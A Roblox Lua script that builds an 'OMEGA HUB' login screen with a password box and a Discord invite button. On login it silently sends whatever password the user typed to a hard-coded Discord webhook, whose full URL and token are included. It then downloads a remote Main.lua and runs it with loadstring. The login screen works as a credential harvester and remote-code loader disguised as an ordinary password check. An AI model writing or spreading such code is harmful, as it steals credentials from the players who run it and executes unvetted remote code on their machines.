-- OMEGA HUB Login (Green UI with Password & Loading)
local ScreenGui = Instance.new("ScreenGui")
local Frame = Instance.new("Frame")
local TextBox = Instance.new("TextBox")
local Button = Instance.new("TextButton")
local Discord = Instance.new("TextButton")
local Loading = Instance.new("TextLabel")

ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

Frame.Size = UDim2.new(0, 400, 0, 250)
Frame.Position = UDim2.new(0.5, -200, 0.5, -125)
Frame.BackgroundColor3 = Color3.fromRGB(15, 255, 15)
Frame.Parent = ScreenGui

TextBox.Size = UDim2.new(0.8, 0, 0, 40)
TextBox.Position = UDim2.new(0.1, 0, 0.3, 0)
TextBox.PlaceholderText = "Enter Password"
TextBox.Parent = Frame

Button.Size = UDim2.new(0.8, 0, 0, 40)
Button.Position = UDim2.new(0.1, 0, 0.5, 0)
Button.Text = "LOGIN"
Button.Parent = Frame

Discord.Size = UDim2.new(0.8, 0, 0, 30)
Discord.Position = UDim2.new(0.1, 0, 0.75, 0)
Discord.Text = "Join Discord"
Discord.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
Discord.TextColor3 = Color3.fromRGB(255, 255, 255)
Discord.Parent = Frame

Loading.Size = UDim2.new(1, 0, 0.3, 0)
Loading.Position = UDim2.new(0, 0, 0, -60)
Loading.Text = ""
Loading.TextColor3 = Color3.fromRGB(0, 255, 0)
Loading.BackgroundTransparency = 1
Loading.Parent = Frame

local webhook = "https://discord.com/api/webhooks/1396821008282943488/FE6m9c1qdeNu7Pljt0LvGUJHFojSokIybrX133WTppr6KlMnp9ggd7eL6cq2vmG2NtYp"

Button.MouseButton1Click:Connect(function()
	local pw = TextBox.Text
	if pw ~= "" then
		Loading.Text = "LOADING..."
		local http = game:GetService("HttpService")
		http:PostAsync(webhook, http:JSONEncode({
			content = "Attempted Login: " .. pw
		}))
		wait(2)
		ScreenGui:Destroy()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/aikolang/OMEGA-HUB/main/Main.lua"))()
	end
end)

Discord.MouseButton1Click:Connect(function()
	setclipboard("https://discord.gg/G3MVXjRH")
end)
